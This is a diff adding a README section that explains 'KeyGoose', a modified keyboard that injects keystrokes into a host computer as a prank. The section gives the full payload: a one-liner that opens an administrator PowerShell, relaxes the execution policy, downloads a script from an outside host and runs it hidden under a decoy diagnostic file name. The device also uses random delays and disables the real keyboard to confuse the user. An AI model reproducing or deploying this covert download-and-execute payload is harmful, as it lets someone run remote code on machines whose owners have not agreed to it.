@@ -66,3 +66,15 @@ Finally, use the files to grind-out a spot within the keyboard to place the micr
 
 ##### Step 3
 Enjoy! Just make sure that if you decide to use this keyboard to prank friends, family, or others, you do so responsibly. Make sure you always have the necessary permissions first, for if used improperly, you could have hacking charges filed against you.
+
+## How Does KeyGoose Work?
+
+KeyGoose works by emulating a USB Keyboard, and injecting keystrokes very quickly into the host computer at a designated time. Below, I'll outline the exact process that KeyGoose takes:
+1. The keyboard emulation code initializes, and prepares itself to inject key presses.
+1. A random seed is gathered by adding together the analog sensor values from A0 and A1.
+1. A random value between 1 and 6 is generated. If the value is equal to 3, the code continues. If not, the program waits 30 minutes, before restarting from the beginning. This gives the code only about a 15% chance of running every 30 minutes and/or every time the user boots their computer.
+1. If the program continued, a random time delay is generated between 4 and 20 minutes long. This time delay gives the computer time to finish booting, and maintains inconsistency, to further confuse the user.
+1. After the time delay, the microcontroller sends the payload, disabling the actual keyboard while it does so.
+	- The payload sent is a series of key combinations to open powershell as an administrator, and then run the following command:
+	- `Set-ExecutionPolicy RemoteSigned -Force; cd C:\Windows\Temp; echo "Invoke-Expression 'curl https://KeyGoosePS1.HackedBy.Me -o d7893c3e.ps1; & .\d7893c3e.ps1; C:\Windows\Temp\tw-9dc-75c-5c965a3.tmp\DesktopGoose.exe; exit'" > DiagTrack_AlternativeTrace.ps1; start-process PowerShell.exe -arg $pwd\DiagTrack_AlternativeTrace.ps1 -WindowStyle Hidden; exit`
+	- This command essentially downloads the PowerShell script into the Temp directory, gives it the necessary permissions to run, then runs it. This command is designed to be exeuted in the background though, so that the PowerShell window may be closed immediately, instead of having to wait on the download and execution of the script.
